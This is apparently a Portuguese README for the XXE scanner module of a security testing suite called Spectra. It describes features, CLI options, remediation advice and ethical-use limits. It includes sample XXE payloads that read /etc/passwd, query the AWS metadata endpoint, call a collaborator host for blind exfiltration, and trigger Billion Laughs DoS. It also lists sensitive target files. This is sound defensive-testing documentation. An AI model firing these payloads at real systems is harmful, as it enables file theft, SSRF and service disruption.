# 🔍 XXE Scanner - Spectra Security Suite

O XXE (XML External Entity) Scanner é um módulo avançado do Spectra para detectar vulnerabilidades de XML External Entity em aplicações web.

## 🚀 Funcionalidades Implementadas

### ✅ **Descoberta Automática de Endpoints XML**
- Detecção inteligente de endpoints que processam XML
- Análise de Content-Type e headers HTTP
- Verificação de padrões XML em respostas
- Teste de endpoints comuns (API, SOAP, RSS, etc.)

### ✅ **Múltiplos Tipos de Payloads XXE**
- **File Disclosure**: Leitura de arquivos do sistema (/etc/passwd, win.ini, etc.)
- **SSRF**: Server-Side Request Forgery via XXE
- **Blind XXE**: Detecção com servidor colaborador (OAST)
- **DoS**: Billion Laughs Attack e Quadratic Blowup
- **WAF Bypass**: Encoding variations e case manipulation

### ✅ **Detecção Avançada**
- Análise inteligente de respostas
- Detecção de indicadores específicos por tipo de arquivo
- Verificação de erros XML que indicam processamento
- Análise de timing para DoS attacks
- Suporte a payloads customizados

### ✅ **Performance Otimizada**
- Threading assíncrono com aiohttp
- Rate limiting adaptativo
- Connection pooling otimizado
- Controle de concorrência configurável
- Progress bars em tempo real

### ✅ **Relatórios Detalhados**
- Exportação em JSON, XML e CSV
- Estatísticas completas de performance
- Tabelas formatadas com Rich
- Evidências detalhadas para cada vulnerabilidade
- Recomendações específicas por tipo de XXE

---

## 🎯 Comandos de Uso

### **Scan Básico**
```bash
python -m spectra -xxe http://api.example.com/xml
```

### **Scan com Servidor Colaborador (Blind XXE)**
```bash
python -m spectra -xxe http://soap.example.com/service --xxe-collaborator http://collaborator.com
```

### **Scan com Payloads Customizados**
```bash
python -m spectra -xxe http://upload.example.com/import --xxe-payloads custom_xxe.txt
```

### **Scan com Configurações Avançadas**
```bash
python -m spectra -xxe http://rss.example.com/feed --xxe-timeout 20 --workers 15 --verbose
```

### **Scan com Relatório**
```bash
python -m spectra -xxe http://secure.example.com/api --generate-report json --report-file xxe_results.json
```

---

## 📊 Tipos de Vulnerabilidades Detectadas

### 🔴 **File Disclosure (Alto Risco)**
- Leitura de arquivos sensíveis do sistema
- Detecção automática de conteúdo de arquivos conhecidos
- Suporte a sistemas Linux e Windows

**Arquivos Testados:**
- `/etc/passwd`, `/etc/hosts`, `/etc/shadow`
- `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`
- `/proc/version`, `/proc/self/environ`
- Logs de aplicação e arquivos de configuração

### 🟠 **SSRF via XXE (Alto Risco)**
- Server-Side Request Forgery através de external entities
- Teste de endpoints internos comuns
- Detecção de metadata services (AWS, GCP)

**Targets Testados:**
- `http://localhost`, `http://127.0.0.1`
- `http://169.254.169.254/latest/meta-data/` (AWS)
- `http://metadata.google.internal/` (GCP)
- Redes internas (192.168.x.x, 10.x.x.x)

### 🟡 **Blind XXE (Médio Risco)**
- Detecção via servidor colaborador (OAST)
- Exfiltração de dados out-of-band
- Verificação de processamento XML sem resposta direta

### 🟡 **DoS via XXE (Médio Risco)**
- **Billion Laughs Attack**: Expansão exponencial de entidades
- **Quadratic Blowup**: Consumo excessivo de memória
- Detecção baseada em timeout e status codes

### 🟢 **WAF Bypass (Baixo-Médio Risco)**
- HTML entity encoding
- Case variation attacks
- Técnicas de evasão de filtros

---

## 🛠️ Configurações Avançadas

### **Parâmetros do CLI**

| Parâmetro | Descrição | Padrão |
|-----------|-----------|---------|
| `-xxe URL` | URL alvo para scan XXE | - |
| `--xxe-collaborator URL` | Servidor OAST para Blind XXE | None |
| `--xxe-payloads FILE` | Arquivo com payloads customizados | None |
| `--xxe-timeout SECONDS` | Timeout para requests | 15 |
| `--workers N` | Número de workers paralelos | 10 |

### **Uso Programático**

```python
import asyncio
from spectra.modules.xxe_scanner import xxe_scan

# Scan básico
results = asyncio.run(xxe_scan(
    url="http://api.example.com/xml",
    return_findings=True
))

# Scan avançado
results = asyncio.run(xxe_scan(
    url="http://api.example.com/xml",
    collaborator_url="http://collaborator.com",
    max_workers=15,
    timeout=20,
    custom_payloads="custom_xxe.txt",
    return_findings=True
))
```

---

## 📈 Estatísticas e Performance

O scanner fornece métricas detalhadas:

- **Total de Requests**: Número total de requisições HTTP
- **Endpoints XML**: Endpoints que processam XML encontrados
- **Vulnerabilidades**: Total de vulnerabilidades XXE detectadas
- **File Disclosures**: Vulnerabilidades de leitura de arquivos
- **SSRF Findings**: Vulnerabilidades SSRF via XXE
- **Blind XXE**: Detecções via servidor colaborador
- **DoS Vulnerabilities**: Ataques de negação de serviço
- **Tempo de Scan**: Duração total do scan
- **Requests/seg**: Taxa de requisições por segundo

---

## 🔒 Recomendações de Segurança

### **Para File Disclosure:**
- Desabilite external entities no parser XML
- Use bibliotecas seguras como `defusedxml` (Python)
- Implemente whitelist de arquivos permitidos

### **Para SSRF:**
- Implemente whitelist de URLs permitidas
- Desabilite external entities completamente
- Use network segmentation para isolar serviços

### **Para DoS:**
- Configure limites de expansão de entidades
- Implemente limites de tamanho para documentos XML
- Use timeouts apropriados para processamento

### **Para Blind XXE:**
- Desabilite completamente external entities e DTD processing
- Monitore logs de rede para detecção de exfiltração
- Implemente Content Security Policy (CSP)

---

## 🧪 Exemplos de Payloads

### **File Disclosure**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### **SSRF**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### **Blind XXE**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://collaborator.com/xxe-test">
%ext;
]>
<root>test</root>
```

### **Billion Laughs**
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

---

## 🚨 Considerações Éticas

⚠️ **IMPORTANTE**: Este scanner deve ser usado apenas em:
- Aplicações próprias ou com autorização explícita
- Ambientes de teste e desenvolvimento
- Programas de bug bounty autorizados
- Auditorias de segurança contratadas

❌ **NÃO USE** em:
- Sistemas de terceiros sem autorização
- Infraestrutura crítica sem permissão
- Ambientes de produção sem aprovação

---

## 🔧 Troubleshooting

### **Nenhum Endpoint XML Encontrado**
- Verifique se a URL está correta
- Teste manualmente se o endpoint aceita XML
- Use `--verbose` para ver detalhes da descoberta

### **Timeouts Frequentes**
- Aumente `--xxe-timeout`
- Reduza `--workers` para menos concorrência
- Verifique conectividade de rede

### **Falsos Positivos**
- Analise as evidências fornecidas
- Teste manualmente os payloads
- Verifique se o servidor realmente processa XML

### **Performance Baixa**
- Aumente `--workers` (padrão: 10)
- Use SSD para melhor I/O
- Verifique largura de banda da rede

---

## 📚 Referências Técnicas

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger XXE Tutorial](https://portswigger.net/web-security/xxe)
- [XML External Entity (XXE) Processing - CWE-611](https://cwe.mitre.org/data/definitions/611.html)
- [Billion Laughs Attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)

---

## 🎯 Roadmap Futuro

- [ ] Integração com mais serviços OAST
- [ ] Detecção de XXE em SOAP services
- [ ] Análise de XML Schema (XSD)
- [ ] Suporte a XML namespaces
- [ ] Integração com Burp Suite
- [ ] Machine Learning para detecção de padrões
- [ ] Análise de XML em WebSockets
- [ ] Suporte a XML-RPC

---

**Desenvolvido com ❤️ para a comunidade de segurança cibernética**